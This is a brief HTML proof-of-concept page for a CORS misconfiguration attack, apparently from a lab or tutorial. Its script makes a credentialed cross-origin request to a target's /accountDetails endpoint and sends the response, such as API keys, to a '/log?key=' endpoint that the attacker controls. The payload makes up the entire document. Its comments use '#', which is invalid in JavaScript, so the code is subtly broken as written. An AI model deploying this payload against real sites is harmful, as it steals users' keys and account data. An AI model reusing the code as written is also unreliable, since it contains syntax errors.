<html>
  <body>
    <script>

    #Initialize the XMLHttpRequest object, and the application URL vairable 
        var req = new XMLHttpRequest();
        var url = ("APPLICATION URL");

    #MLHttpRequest object loads, exectutes reqListener() function
      req.onload = retrieveKeys;

    #Make GET request to the application accounDetails location
        req.open('GET', url + "/accountDetails",true);
    
    #Allow passing credentials with the requests
    req.withCredentials = true;

    #Send the request 
        req.send(null);

    function retrieveKeys() {
            location='/log?key='+this.responseText;
        };

  </script>
  <body>
</html>
